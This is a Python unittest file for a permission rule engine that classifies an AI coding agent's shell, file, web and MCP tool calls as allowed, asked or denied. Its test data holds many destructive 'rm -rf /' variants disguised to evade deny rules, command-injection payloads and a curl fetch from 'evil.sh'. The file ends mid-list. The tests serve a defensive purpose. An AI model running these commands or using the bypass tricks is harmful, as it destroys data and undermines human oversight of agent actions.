# SPDX-License-Identifier: MIT

# Copyright (c) 2026 Peter Kokosharov <peter.kokosharov@gmail.com>
# LLM: claude-sonnet-5-5, claude-opus-5-5
# Licensed under MIT License

"""Tests for the configurable permission rule engine."""

from __future__ import annotations

import tempfile
import unittest
from pathlib import Path

from runtimelib.permissions.base import PermissionResult as R
from runtimelib.permissions.rules import (
    PermissionRules,
    RuleParseError,
    normalize_path,
    parse_rule,
    split_bash,
    store_path,
)

WS = "/work/proj"

CONFIG = {
    "allow": [
        "bash(pytest *)", "bash(git status*)", "bash(ls*)", "fileops(read:**)",
        "edit(src/**)", "webfetch(domain:docs.python.org)",
    ],
    "ask": ["bash(git push*)"],
    "deny": ["bash(rm -rf *)", "edit(**/.env)", "fileops(write:**/.env)", "mcp__github__delete_*"],
}


def rules(cfg=None, **kw):
    kw.setdefault("persist", False)
    return PermissionRules(CONFIG if cfg is None else cfg, WS, **kw)


def bash(cmd):
    return {"command": cmd}


class ParseTests(unittest.TestCase):
    def test_parse_forms(self):
        r = parse_rule("bash(pytest *)", "allow")
        self.assertEqual((r.tool, r.spec, r.decision), ("bash", "pytest *", R.ALLOW))
        r = parse_rule("mcp__github__delete_*", R.DENY)
        self.assertEqual((r.tool, r.spec), ("mcp__github__delete_*", None))
        self.assertEqual(parse_rule("bash(echo (a))", "ask").spec, "echo (a)")

    def test_parse_errors(self):
        for bad in ("", "  ", "bash()", "(x)"):
            with self.assertRaises(RuleParseError, msg=bad):
                parse_rule(bad, "allow")
        with self.assertRaises(RuleParseError):
            parse_rule("bash", "maybe")

    def test_bad_config_rules_are_skipped(self):
        pr = rules({"allow": ["bash()", "bash(ls*)"]})
        self.assertEqual(len(pr.allow), 1)
        self.assertEqual(len(pr.errors), 1)


class PrecedenceTests(unittest.TestCase):
    def ev(self, tool, args, mode="guard", cfg=None):
        return rules(cfg).evaluate(tool, args, mode)

    def test_table(self):
        cases = [
            ("bash", bash("pytest -q"), "local", R.ALLOW),
            ("bash", bash("pytest"), "local", R.ALLOW),          # trailing " *" matches bare
            ("bash", bash("rm -rf build"), "guard", R.DENY),
            ("bash", bash("git push origin x"), "guard", R.ASK),
            ("bash", bash("git status"), "local", R.ALLOW),
            ("bash", bash("make"), "guard", R.ALLOW),            # guard default allow
            ("bash", bash("make"), "sandbox", R.ASK),
            ("bash", bash("make"), "local", R.ASK),
            ("fileops", {"operation": "read", "path": "a/b.py"}, "local", R.ALLOW),
            ("fileops", {"operation": "write", "path": ".env"}, "guard", R.DENY),
            ("fileops", {"operation": "write", "path": "sub/.env"}, "guard", R.DENY),
            ("fileops", {"operation": "write", "path": "x.py"}, "local", R.ASK),
            ("edit", {"path": "src/a/b.py"}, "local", R.ALLOW),
            ("edit", {"path": "tests/a.py"}, "local", R.ASK),
            ("edit", {"path": "src/.env"}, "local", R.DENY),     # deny beats allow
            ("webfetch", {"url": "https://docs.python.org/3/"}, "local", R.ALLOW),
            ("webfetch", {"url": "https://a.docs.python.org/x"}, "guard", R.ALLOW),
            ("webfetch", {"url": "https://evildocs.python.org.example.com/"}, "guard", R.ASK),
            ("webfetch", {"url": "https://example.com/"}, "guard", R.ASK),
            ("mcp__github__delete_repo", {}, "guard", R.DENY),
            ("mcp__github__list", {}, "guard", R.ASK),
            ("git", {"operation": "status"}, "local", R.ALLOW),  # read kind
            ("git", {"operation": "commit", "message": "m"}, "local", R.ASK),
            ("git", {"operation": "commit", "message": "m"}, "guard", R.ALLOW),
        ]
        for tool, args, mode, want in cases:
            with self.subTest(tool=tool, args=args, mode=mode):
                self.assertEqual(self.ev(tool, args, mode).decision, want)

    def test_deny_beats_allow_and_ask_beats_allow(self):
        cfg = {"allow": ["bash"], "ask": ["bash(git *)"], "deny": ["bash(git push*)"]}
        self.assertEqual(self.ev("bash", bash("git push"), "guard", cfg).decision, R.DENY)
        self.assertEqual(self.ev("bash", bash("git log"), "guard", cfg).decision, R.ASK)
        self.assertEqual(self.ev("bash", bash("ls"), "local", cfg).decision, R.ALLOW)

    def test_local_default_ignores_config(self):
        cfg = {"defaults": {"guard": "allow", "sandbox": "allow", "local": "allow"}}
        self.assertEqual(self.ev("bash", bash("x"), "local", cfg).decision, R.ASK)
        self.assertEqual(self.ev("bash", bash("x"), "sandbox", cfg).decision, R.ALLOW)
        self.assertEqual(self.ev("bash", bash("x"), "weird", cfg).decision, R.ASK)

    def test_guard_default_configurable(self):
        cfg = {"defaults": {"guard": "ask"}}
        self.assertEqual(self.ev("bash", bash("x"), "guard", cfg).decision, R.ASK)
        self.assertEqual(self.ev("bash", bash("x"), "guard", {}).decision, R.ALLOW)

    def test_local_allow_rule_skips_ask(self):
        v = self.ev("bash", bash("pytest -q"), "local")
        self.assertEqual((v.decision, v.source, v.rule), (R.ALLOW, "allow", "bash(pytest *)"))

    def test_read_tools_allowed_everywhere(self):
        for mode in ("guard", "sandbox", "local"):
            self.assertEqual(self.ev("load_skill", {}, mode, {}).decision, R.ALLOW)
            self.assertEqual(self.ev("fileops", {"operation": "grep", "path": "."}, mode, {}).decision, R.ALLOW)

    def test_network_and_mcp_ask_by_default_in_every_mode(self):
        for mode in ("guard", "sandbox", "local"):
            self.assertEqual(self.ev("webfetch", {"url": "https://x.org"}, mode, {}).decision, R.ASK)
            self.assertEqual(self.ev("mcp__s__t", {}, mode, {}).decision, R.ASK)

    def test_tool_glob(self):
        cfg = {"allow": ["mcp__fs__*"]}
        self.assertEqual(self.ev("mcp__fs__read", {}, "local", cfg).decision, R.ALLOW)
        self.assertEqual(self.ev("mcp__other__read", {}, "local", cfg).decision, R.ASK)


class BashTests(unittest.TestCase):
    def test_split(self):
        self.assertEqual(split_bash("a && b || c; d | e\nf")[0], ["a", "b", "c", "d", "e", "f"])
        self.assertEqual(split_bash('echo "a && b" && x')[0], ['echo "a && b"', "x"])
        self.assertEqual(split_bash("echo 'a;b'")[0], ["echo 'a;b'"])
        self.assertEqual(split_bash("a & b")[0], ["a", "b"])

    def test_redirect_ampersand_does_not_split(self):
        for cmd in ("make 2>&1", "make >&2", "make &> /dev/null", "read x <&3", "make >| out"):
            self.assertEqual(split_bash(cmd)[0], [cmd], cmd)
        self.assertEqual(split_bash("make 2>&1 | tee log & ls")[0], ["make 2>&1", "tee log", "ls"])
        self.assertEqual(split_bash("a |& b")[0], ["a", "b"])

    def test_substitution_flags(self):
        for cmd in ("echo $(id)", "echo `id`", "cat <(ls)", "tee >(wc)", 'echo "$(id)"'):
            self.assertTrue(split_bash(cmd)[1], cmd)
        for cmd in ("echo '$(id)'", "echo hi", 'echo "a"'):
            self.assertFalse(split_bash(cmd)[1], cmd)

    def test_compound_allow_needs_every_part(self):
        pr = rules()
        self.assertEqual(pr.evaluate("bash", bash("pytest -q && ls"), "local").decision, R.ASK)
        self.assertEqual(pr.evaluate("bash", bash("pytest -q && make"), "local").decision, R.ASK)
        self.assertEqual(pr.evaluate("bash", bash("pytest -q && make"), "guard").decision, R.ALLOW)

    def test_compound_deny_and_ask_any_part(self):
        pr = rules()
        for sep in (" && ", " || ", "; ", " | ", "\n"):
            self.assertEqual(pr.evaluate("bash", bash(f"ls{sep}rm -rf /"), "guard").decision, R.DENY, sep)
            self.assertEqual(pr.evaluate("bash", bash(f"ls{sep}git push"), "guard").decision, R.ASK, sep)

    def test_substitution_never_auto_allowed(self):
        pr = rules()
        v = pr.evaluate("bash", bash("ls $(pwd)"), "local")
        self.assertEqual((v.decision, v.source), (R.ASK, "unsafe"))
        self.assertEqual(pr.evaluate("bash", bash("pytest `id`"), "local").decision, R.ASK)
        self.assertEqual(pr.evaluate("bash", bash("pytest '$(id)'"), "local").decision, R.ASK)

    def test_deny_sees_inside_substitution(self):
        pr = rules()
        self.assertEqual(pr.evaluate("bash", bash("echo $(rm -rf x)"), "guard").decision, R.DENY)
        self.assertEqual(pr.evaluate("bash", bash("echo `rm -rf x`"), "guard").decision, R.DENY)
        self.assertEqual(pr.evaluate("bash", bash("cat <(rm -rf x)"), "guard").decision, R.DENY)

    def test_deny_bypass_probes(self):
        pr = rules()
        probes = [
            "FOO=1 rm -rf /",
            'bash -c "rm -rf /"',
            "sh -lc 'rm -rf /'",
            "sudo rm -rf /",
            "sudo -u root rm -rf /",
            "/bin/rm -rf /",
            "rm  -rf /",
            "rm\t-rf /",
            "eval rm -rf /",
            "echo x | xargs rm -rf",
            "echo x | xargs -n 1 rm -rf",
            'pytest "$(rm -rf /)"',
            "pytest '$(rm -rf /)'",
            "env -i A=1 nohup time command /usr/bin/rm -rf /",
            "doas rm -rf /",
            "exec rm -rf /",
            "builtin eval 'rm -rf /'",
            'bash -c "bash -c \\"rm -rf /\\""',
            "find . -exec rm -rf {} \\;",
            "find . -name x -execdir rm -rf {} +",
            'rm "-rf" /',
            "echo `rm -rf /`",
            "echo $(echo $(rm -rf /))",
        ]
        for cmd in probes:
            with self.subTest(cmd=cmd):
                self.assertEqual(pr.evaluate("bash", bash(cmd), "guard").decision, R.DENY)

    def test_scheduling_wrappers_stripped(self):
        pr = rules()
        probes = [
            "timeout 5 rm -rf /",
            "timeout -s KILL -k 2 5 rm -rf /",
            "timeout --signal=TERM 5s rm -rf /",
            "nice rm -rf /",
            "nice -n 10 rm -rf /",
            "nice -10 rm -rf /",
            "ionice -c 3 rm -rf /",
            "ionice -c2 -n7 rm -rf /",
            "stdbuf -oL rm -rf /",
            "stdbuf -o L -e 0 rm -rf /",
            "chrt 10 rm -rf /",
            "chrt -f 10 rm -rf /",
            "taskset 0x3 rm -rf /",
            "taskset -c 0,1 rm -rf /",
            "setsid rm -rf /",
            "setsid -f rm -rf /",
            "nohup nice -n 5 timeout 9 sudo /bin/rm -rf /",
        ]
        for cmd in probes:
            with self.subTest(cmd=cmd):
                self.assertEqual(pr.evaluate("bash", bash(cmd), "guard").decision, R.DENY)
        self.assertEqual(pr.evaluate("bash", bash("timeout 5 make"), "guard").decision, R.ALLOW)

    def test_ask_rule_sees_normalised_parts(self):
        pr = rules()
        for cmd in ("GIT_TRACE=1 git push", "sudo git push origin", "/usr/bin/git push"):
            self.assertEqual(pr.evaluate("bash", bash(cmd), "guard").decision, R.ASK, cmd)

    def test_allow_does_not_see_through_wrappers(self):
        pr = rules()
        self.assertEqual(pr.evaluate("bash", bash("sudo pytest -q"), "local").decision, R.ASK)
        self.assertEqual(pr.evaluate("bash", bash("FOO=1 pytest -q"), "local").decision, R.ASK)

    def test_too_deep_nesting_never_auto_allowed(self):
        cmd = "make"
        for _ in range(10):
            cmd = "sh -c " + __import__("shlex").quote(cmd)
        v = rules().evaluate("bash", bash(cmd), "guard")
        self.assertEqual((v.decision, v.source), (R.ASK, "unsafe"))

    def test_redirect_never_auto_allowed(self):
        pr = rules()
        for cmd in ("pytest -q > out.txt", "make >> log", "make 2>&1 > /dev/null", "pytest -q 2>&1", "cat < in"):
            with self.subTest(cmd=cmd):
                self.assertEqual(pr.evaluate("bash", bash(cmd), "local").decision, R.ASK)
        withgt = rules({"allow": ["bash(pytest * > report.txt)"]})
        self.assertEqual(withgt.evaluate("bash", bash("pytest -q > report.txt"), "local").decision, R.ASK)

    def test_quoted_separator_not_split(self):
        self.assertEqual(split_bash('ls "a; rm -rf x"')[0], ['ls "a; rm -rf x"'])
        pr = rules()
        self.assertEqual(pr.evaluate("bash", bash('ls "a; b"'), "guard").decision, R.ALLOW)
        # The deny pass is also quote-blind (best effort, stricter): quoted text that
        # looks like a denied command is denied.
        self.assertEqual(pr.evaluate("bash", bash('ls "a; rm -rf x"'), "guard").decision, R.DENY)

    def test_fail_closed_probes(self):
        pr = rules({"allow": ["bash(echo *)"], "deny": ["bash(rm *)"]})
        for cmd in ("echo hi # don't\nrm -rf /", "echo $'a\\'b' ; rm -rf /"):
            with self.subTest(cmd=cmd):
                self.assertEqual(pr.evaluate("bash", bash(cmd), "local").decision, R.DENY)
                self.assertNotEqual(rules({"allow": ["bash(echo *)"]}).evaluate("bash", bash(cmd), "local").decision,
                                    R.ALLOW)

    CONTINUATION_PAYLOADS = [
        "{cmd} a\\\\\nrm -rf /",          # escaped backslash, then a real newline (2 backslashes)
        "{cmd} a\\\\\\\\\nrm -rf /",      # 4 backslashes
        "{cmd} hi # x\\\nrm -rf /",       # comments never continue
        "{cmd} hi # x\\\\\nrm -rf /",     # comment ending in 2 backslashes
        "{cmd} hi # x\\\\\\\\\nrm -rf /",  # comment ending in 4 backslashes
        "{cmd} a\\\\\r\nrm -rf /",        # CRLF
    ]

    def test_continuation_bypasses(self):
        allows = ["bash(echo *)", "bash(git status*)", "bash(pytest *)"]
        deny = rules({"allow": allows, "deny": ["bash(rm *)"]})
        loose = rules({"allow": allows})
        for cmd in ("echo", "git status", "pytest -q"):
            for payload in self.CONTINUATION_PAYLOADS:
                text = payload.format(cmd=cmd)
                with self.subTest(text=text):
                    self.assertEqual(deny.evaluate("bash", bash(text), "local").decision, R.DENY)
                    self.assertNotEqual(loose.evaluate("bash", bash(text), "local").decision, R.ALLOW)
                    self.assertNotEqual(loose.evaluate("bash", bash(text), "local").decision, R.ALLOW)

    def test_multi_line_never_auto_allowed(self):
        pr = rules({"allow": ["bash(echo *)", "bash(ls*)"]})
        for cmd in ("echo hi\nls", "echo hi\\\nthere", "echo hi\r\nls", "echo hi\rls"):
            with self.subTest(cmd=cmd):
                v = pr.evaluate("bash", bash(cmd), "local")
                self.assertEqual((v.decision, v.source), (R.ASK, "unsafe"))
                self.assertIn("safe characters", v.reason)

    def test_continuation_only_where_bash_joins(self):
        self.assertEqual(split_bash("echo a\\\\\nls")[0], ["echo a\\\\", "ls"])
        self.assertEqual(split_bash("echo hi # c\\\nls")[0], ["echo hi", "ls"])
        self.assertEqual(split_bash('echo "a\\\nb"')[0], ['echo "ab"'])
        self.assertEqual(split_bash("echo 'a\\\nb'; ls")[0], ["echo 'a\\\nb'", "ls"])

    def _timed(self, pr, cmd, mode="guard"):
        import time
        start = time.perf_counter()
        v = pr.evaluate("bash", bash(cmd), mode)
        self.assertLess(time.perf_counter() - start, 1.0, f"took too long ({len(cmd)} chars)")
        return v

    def test_complexity_cap_timing_shapes(self):
        pr = rules({"allow": ["bash(echo *)"], "deny": ["bash(rm *)"]})
        shapes = {
            "unclosed quote 200 KB": "echo '" + "a" * 200_000,
            "3000 nested $(": "echo " + "$(" * 3000 + "x" + ")" * 3000,
            "20000 parts": ";".join(["echo hi"] * 20_000),
        }
        for name, cmd in shapes.items():
            with self.subTest(shape=name):
                v = self._timed(pr, cmd)
                self.assertEqual((v.decision, v.source), (R.ASK, "unsafe"))
                self.assertIn("too complex", v.reason)
                self.assertEqual(pr.exact_rules("bash", bash(cmd)), [])

    def test_complexity_cap_prefix_deny(self):
        pr = rules({"deny": ["bash(rm *)"]})
        for cmd in ("rm -rf /; " + "echo hi;" * 20_000,
                    "echo $(rm -rf /) " + "$(" * 3000 + ")" * 3000,
                    "rm -rf / " + "x" * 20_000):
            with self.subTest(cmd=cmd[:30]):
                self.assertEqual(self._timed(pr, cmd).decision, R.DENY)

    def test_complexity_limits(self):
        from runtimelib.permissions.rules import too_complex
        self.assertEqual(too_complex("echo hi; ls"), "")
        self.assertIn("KB", too_complex("x" * (16 * 1024 + 1)))
        self.assertIn("parts", too_complex(";".join(["a"] * 257)))
        self.assertEqual(too_complex(";".join(["a"] * 256)), "")
        self.assertIn("substitutions", too_complex(" ".join(["$(a)"] * 33)))
        self.assertIn("nested", too_complex("$(" * 9 + ")" * 9))
        self.assertEqual(too_complex("$(" * 8 + ")" * 8), "")

    def test_comments_and_ansi_c_quotes(self):
        self.assertEqual(split_bash("echo hi # it's; rm x\nls")[0], ["echo hi", "ls"])
        self.assertEqual(split_bash("echo a#b; ls")[0], ["echo a#b", "ls"])
        self.assertEqual(split_bash("echo $'a\\'b;c' ; ls")[0], ["echo $'a\\'b;c'", "ls"])
        self.assertEqual(split_bash("ec\\\nho hi")[0], ["echo hi"])

    REVIEW_PROBES = [
        "f(){ rm -rf /; }; f",
        "{ rm -rf /; }",
        "( rm -rf / )",
        "(rm -rf /)",
        "if true; then rm -rf /; fi",
        "! rm -rf /",
        "coproc rm -rf /",
        "r\\\nm -rf /",
        "rm${IFS}-rf${IFS}/",
        "{rm,-rf,/}",
        "x=rm; $x -rf /",
        "env -S 'rm -rf /'",
        "bash -o errexit -c 'rm -rf /'",
        "bash -c -- 'rm -rf /'",
        "sh <<< 'rm -rf /'",
        "echo rm -rf / | sh",
        "busybox rm -rf /",
        "su -c 'rm -rf /'",
        "watch rm -rf /",
        "watch -n 1 'rm -rf /'",
        "cmd //c del x",
    ]

    def test_review_probes_never_allowed_in_local(self):
        # Allow rules for the harmless-looking pieces must not let them through.
        # (An explicit allow for a wrapper such as bash(sudo *) or bash(bash *) is
        # the user's choice and is honoured.)
        pr = rules({"allow": ["bash(echo *)", "bash(f)", "bash(true)", "bash(x=rm)", "bash(fi)",
                              "bash(sh)", "bash(then *)", "bash(! *)"]})
        for cmd in self.REVIEW_PROBES:
            with self.subTest(cmd=cmd):
                self.assertIn(pr.evaluate("bash", bash(cmd), "local").decision, (R.ASK, R.DENY))

    def test_review_probes_denied_by_rm_rule(self):
        pr = rules({"deny": ["bash(rm *)"]})
        for cmd in self.REVIEW_PROBES:
            if cmd.startswith("cmd "):
                continue  # del is not rm
            with self.subTest(cmd=cmd):
                self.assertEqual(pr.evaluate("bash", bash(cmd), "local").decision, R.DENY)
        pr = rules({"deny": ["bash(del *)"]})
        self.assertEqual(pr.evaluate("bash", bash("cmd //c del x"), "local").decision, R.DENY)
        self.assertEqual(pr.evaluate("bash", bash("cmd.exe /C del x"), "local").decision, R.DENY)

    def test_more_wrappers_denied(self):
        pr = rules({"deny": ["bash(rm *)"]})
        for cmd in ("flock /tmp/l rm -rf /", "flock -c 'rm -rf /' /tmp/l", "chroot / rm -rf /",
                    "unshare -r rm -rf /", "nsenter -t 1 -m rm -rf /", "runuser -u bob -- rm -rf /",
                    "runuser -l bob -c 'rm -rf /'", "systemd-run --user -p X=1 rm -rf /",
                    "script -qc 'rm -rf /' /dev/null", "sh -c 'echo rm -rf / | bash'",
                    "function f { rm -rf /; }", "while true; do rm -rf /; done"):
            with self.subTest(cmd=cmd):
                self.assertEqual(pr.evaluate("bash", bash(cmd), "guard").decision, R.DENY)

    def test_only_simple_commands_auto_allowed(self):
        pr = rules({"allow": ["bash(cat *)", "bash(python *)", "bash(source *)", "bash(make *)"]})
        for cmd in ("cat <<EOF\nx\nEOF", "cat x | python", "cat x | sudo python3 -",
                    "make {a,b}", "$MAKE all", "\\make all", "m*ke all", "cat a | make -f -"):
            with self.subTest(cmd=cmd):
                self.assertEqual(pr.evaluate("bash", bash(cmd), "local").decision, R.ASK)
        for cmd in ("make all", "python tool.py", "make 'a b'"):
            with self.subTest(cmd=cmd):
                self.assertEqual(pr.evaluate("bash", bash(cmd), "local").decision, R.ALLOW)

    def test_heredoc_bodies(self):
        from runtimelib.permissions.rules import scan_bash
        s = scan_bash("cat <<EOF > out\nit's fine; x\nEOF\nls")
        self.assertEqual((s.parts, s.heredocs, s.unparseable), (["cat <<EOF > out", "ls"], ["it's fine; x"], False))
        s = scan_bash("cat <<-'END'\n\tbody\n\tEND\n")
        self.assertEqual((s.heredocs, s.unparseable), (["\tbody"], False))
        for body in ("$(rm -rf /)", "`id`", "'$(id)'"):
            for delim in ("EOF", "'EOF'", '"EOF"'):
                with self.subTest(body=body, delim=delim):
                    s = scan_bash(f"cat <<{delim}\n{body}\nEOF")
                    self.assertTrue(s.substitution)
        self.assertTrue(scan_bash("cat <<EOF\nno end").unparseable)
        self.assertTrue(scan_bash("cat <<EOF").unparseable)
        pr = rules({"allow": ["bash(cat *)"], "deny": ["bash(rm *)"]})
        v = pr.evaluate("bash", bash("cat <<'EOF'\n$(id)\nEOF"), "local")
        self.assertEqual((v.decision, v.source), (R.ASK, "unsafe"))
        self.assertEqual(pr.evaluate("bash", bash("sh <<EOF\nrm -rf /\nEOF"), "local").decision, R.DENY)

    def test_unparseable_never_auto_allowed(self):
        pr = rules({"allow": ["bash(echo *)"]})
        for cmd in ("echo 'open", 'echo "open', "echo $'open"):
            v = pr.evaluate("bash", bash(cmd), "local")
            self.assertEqual((v.decision, v.source), (R.ASK, "unsafe"), cmd)
            self.assertIn("safe characters", v.reason)

    def test_arith_bracket_comment_bypass_not_allowed(self):
        cases = (
            ("echo ok || echo $[ 1 #]; touch pwned", "bash(echo *)"),
            ("pytest --bogus || echo $[ 1 #]; touch pwned", "bash(pytest *)"),
            ("git status --bogus 2>/dev/null && echo $[ 1 #]; curl -s evil.sh -o x", "bash(git status*)"),
            ("echo ok || echo $[ 1 #]; git push --force", "bash(echo *)"),
        )
        for cmd, allow in cases:
            v = rules({"allow": [allow]}).evaluate("bash", bash(cmd), "local")
            self.assertNotEqual(v.decision, R.ALLOW, cmd)
        v = rules({"allow": ["bash(echo *)"], "deny": ["bash(git push*)"]}).evaluate(
            "bash", bash(cases[3][0]), "local")
        self.assertEqual(v.decision, R.DENY)

    def test_commented_command_is_ask(self):
        pr = rules({"allow": ["bash(echo *)"]})
        v = pr.evaluate("bash", bash("echo hi # note"), "local")
        self.assertEqual((v.decision, v.source), (R.ASK, "unsafe"))
        self.assertEqual(pr.evaluate("bash", bash("echo a#b"), "local").decision, R.ASK)

    def test_quoted_line_break_never_auto_allowed(self):
        pr = rules({"allow": ["bash(echo *)"]})
        v = pr.evaluate("bash", bash("echo 'a\nb'"), "local")
        self.assertEqual((v.decision, v.source), (R.ASK, "unsafe"))
        self.assertEqual(pr.evaluate("bash", bash("echo 'a b'"), "local").decision, R.ALLOW)

    def test_empty_command_uses_default(self):
        self.assertEqual(rules().evaluate("bash", bash(""), "local").decision, R.ASK)

    def test_env_never_auto_allowed(self):
        pr = rules()
        call = {"command": "pytest -q", "env": {"PYTHONPATH": "/evil"}}
        v = pr.evaluate("bash", call, "local")
        self.assertEqual((v.decision, v.source), (R.ASK, "unsafe"))
        self.assertIn("environment", v.reason)
        self.assertEqual(pr.evaluate("bash", call, "local").decision, R.ASK)
        self.assertEqual(pr.evaluate("bash", {"command": "pytest -q", "env": {}}, "local").decision, R.ALLOW)
        deny = {"command": "rm -rf /", "env": {"A": "1"}}
        self.assertEqual(pr.evaluate("bash", deny, "local").decision, R.DENY)


class PathTests(unittest.TestCase):
    def test_normalize(self):
        cases = [
            ("a/b.py", "a/b.py"),
            ("./a//b.py", "a/b.py"),
            ("a/../b.py", "b.py"),
            ("/work/proj/src/x.py", "src/x.py"),
            ("/work/proj", "."),
            ("../other/x", "/work/other/x"),
            ("src/../../x", "/work/x"),
            ("/etc/passwd", "/etc/passwd"),
            ("src\\a\\b.py", "src/a/b.py"),
        ]
        for given, want in cases:
            with self.subTest(given=given):
                self.assertEqual(normalize_path(given, WS), want)

    def test_windows_workspace_and_paths(self):
        ws = "C:\\Users\\me\\proj"
        self.assertEqual(normalize_path("C:\\Users\\me\\proj\\src\\a.py", ws), "src/a.py")
        self.assertEqual(normalize_path("src\\a.py", ws), "src/a.py")
        self.assertEqual(normalize_path("..\\x.py", ws), "C:/Users/me/x.py")

    def test_dotdot_cannot_escape_edit_allow(self):
        pr = rules()
        self.assertEqual(pr.evaluate("edit", {"path": "src/../secret.txt"}, "local").decision, R.ASK)
        self.assertEqual(pr.evaluate("edit", {"path": "src/../.env"}, "local").decision, R.DENY)
        self.assertEqual(pr.evaluate("edit", {"path": "/work/proj/src/ok.py"}, "local").decision, R.ALLOW)

    def test_windows_separator_in_rule_and_call(self):
        pr = rules({"allow": ["edit(src\\**)"]})
        self.assertEqual(pr.evaluate("edit", {"path": "src\\a\\b.py"}, "local").decision, R.ALLOW)

    def test_single_star_does_not_cross_dirs(self):
        pr = rules({"allow": ["edit(src/*.py)"]})
        self.assertEqual(pr.evaluate("edit", {"path": "src/a.py"}, "local").decision, R.ALLOW)
        self.assertEqual(pr.evaluate("edit", {"path": "src/x/a.py"}, "local").decision, R.ASK)

    def test_deny_env_outside_workspace(self):
        pr = rules()
        self.assertEqual(pr.evaluate("edit", {"path": "/home/x/.env"}, "guard").decision, R.DENY)

    def test_search_inside_denied_read_path(self):
        for cfg in ({"deny": ["fileops(read:secrets/**)"]}, {"deny": ["fileops(secrets/**)"]},
                    {"deny": ["fileops(read:secrets/*)"]}):
            pr = rules(cfg)
            for op in ("grep", "glob", "list"):
                for path in ("secrets", "secrets/sub", "./secrets/"):
                    with self.subTest(cfg=cfg, op=op, path=path):
                        args = {"operation": op, "path": path}
                        self.assertEqual(pr.evaluate("fileops", args, "guard").decision, R.DENY)
            self.assertEqual(pr.evaluate("fileops", {"operation": "grep", "path": "src"}, "guard").decision,
                             R.ALLOW)
        pr = rules({"deny": ["fileops(read:**/.env)"]})
        self.assertEqual(pr.evaluate("fileops", {"operation": "grep", "path": "."}, "guard").decision, R.ALLOW)

    def test_render_diagram_is_write(self):
        self.assertEqual(rules({}).evaluate("render_diagram", {}, "local").decision, R.ASK)
        self.assertEqual(rules({}).evaluate("render_diagram", {}, "guard").decision, R.ALLOW)

    def test_fileops_without_op(self):
        pr = rules({"deny": ["fileops(secrets/**)"]})
        self.assertEqual(pr.evaluate("fileops", {"operation": "read", "path": "secrets/k"}, "guard").decision, R.DENY)


class AllowAlwaysTests(unittest.TestCase):
    def test_exact_rule_and_persistence(self):
        with tempfile.TemporaryDirectory() as d:
            pr = PermissionRules(CONFIG, WS, store_dir=d)
            self.assertEqual(pr.evaluate("bash", bash("make test"), "local").decision, R.ASK)
            added = pr.add_allow_always("bash", bash("make test"))
            self.assertEqual(added, ["bash(make test)"])
            self.assertEqual(pr.evaluate("bash", bash("make test"), "local").decision, R.ALLOW)
            self.assertEqual(pr.evaluate("bash", bash("make all"), "local").decision, R.ASK)
            self.assertTrue(store_path(WS, d).is_file())
            again = PermissionRules(CONFIG, WS, store_dir=d)
            self.assertEqual(again.evaluate("bash", bash("make test"), "local").decision, R.ALLOW)
            other = PermissionRules(CONFIG, "/work/other", store_dir=d)
            self.assertEqual(other.evaluate("bash", bash("make test"), "local").decision, R.ASK)

    def test_glob_chars_escaped(self):
        pr = rules()
        pr.add_allow_always("bash", bash("rm a*b"))
        self.assertEqual(pr.evaluate("bash", bash("rm axb"), "local").decision, R.ASK)
        pr.add_allow_always("bash", bash("echo a*"))
        self.assertEqual(pr.evaluate("bash", bash("echo abc"), "local").decision, R.ASK)

    def test_compound_adds_one_rule_per_part(self):
        pr = rules()
        added = pr.add_allow_always("bash", bash("make a && make b"))
        self.assertEqual(added, ["bash(make a)", "bash(make b)"])
        self.assertEqual(pr.evaluate("bash", bash("make b"), "local").decision, R.ALLOW)

    def test_no_junk_rules(self):
        pr = rules()
        self.assertEqual(pr.add_allow_always("bash", bash("make 2>&1")), ["bash(make 2>&1)"])
        self.assertEqual(pr.exact_rules("bash", bash("1 & 2>&1")), [])
        self.assertNotIn("bash(1)", [r.text for r in pr.allow])

    def test_deny_still_beats_allow_always(self):
        pr = rules()
        pr.add_allow_always("edit", {"path": "x/.env"})
        self.assertEqual(pr.evaluate("edit", {"path": "x/.env"}, "local").decision, R.DENY)

    def test_other_kinds(self):
        pr = rules()
        self.assertEqual(pr.add_allow_always("webfetch", {"url": "https://example.com/a"}),
                         ["webfetch(domain:example.com)"])
        self.assertEqual(pr.evaluate("webfetch", {"url": "https://example.com/b"}, "local").decision, R.ALLOW)
        self.assertEqual(pr.add_allow_always("mcp__s__t", {}), ["mcp__s__t"])
        self.assertEqual(pr.evaluate("mcp__s__t", {}, "local").decision, R.ALLOW)
        pr.add_allow_always("fileops", {"operation": "write", "path": "a/[x].txt"})
        self.assertEqual(pr.evaluate("fileops", {"operation": "write", "path": "a/[x].txt"}, "local").decision, R.ALLOW)
        self.assertEqual(pr.evaluate("fileops", {"operation": "write", "path": "a/x.txt"}, "local").decision, R.ASK)

    def test_webfetch_host_glob_chars_escaped(self):
        pr = rules()
        added = pr.add_allow_always("webfetch", {"url": "http://*/x"})
        self.assertEqual(added, ["webfetch(domain:[*])"])
        self.assertEqual(pr.evaluate("webfetch", {"url": "https://evil.example/"}, "local").decision, R.ASK)

    def test_store_reads_only_allow_section(self):
        with tempfile.TemporaryDirectory() as d:
            p = store_path(WS, d)
            p.parent.mkdir(parents=True, exist_ok=True)
            p.write_text('deny:\n  - "bash(make)"\nallow:\n  - "bash(ok)"\nother:\n  - "bash(rm *)"\n',
                         encoding="utf-8")
            pr = PermissionRules({}, WS, store_dir=d)
            self.assertEqual([r.text for r in pr.allow], ["bash(ok)"])

    def test_store_write_merges_and_is_atomic(self):
        with tempfile.TemporaryDirectory() as d:
            a = PermissionRules({}, WS, store_dir=d)
            b = PermissionRules({}, WS, store_dir=d)  # a second rex process, same workspace
            a.add_allow_always("bash", bash("make a"))
            b.add_allow_always("bash", bash("make b"))
            fresh = PermissionRules({}, WS, store_dir=d)
            self.assertEqual(sorted(r.text for r in fresh.allow), ["bash(make a)", "bash(make b)"])
            self.assertEqual(sorted(x.name for x in Path(d).iterdir()), [store_path(WS, d).name])

    def test_store_survives_garbage(self):
        with tempfile.TemporaryDirectory() as d:
            p = store_path(WS, d)
            p.parent.mkdir(parents=True, exist_ok=True)
            p.write_text('allow:\n  - "bash(ok)"\n  - "bad\n  - "bash()"\njunk\n', encoding="utf-8")
            pr = PermissionRules({}, WS, store_dir=d)
            self.assertEqual(pr.evaluate("bash", bash("ok"), "local").decision, R.ALLOW)
            self.assertTrue(pr.errors)



ROUND_PAYLOADS = [
    r'''echo "${x:=\$(echo PWNED1)}${x@P}"''',
    r'''echo "${x:=a[\$(echo PWNED2 >&2)]}" "${a[x]}"''',
    r"""printf -v 'a[$(echo PWNED3 >&2)]' x""",
    r"""echo $'\' ; echo PWNED4 ; echo '\'""",
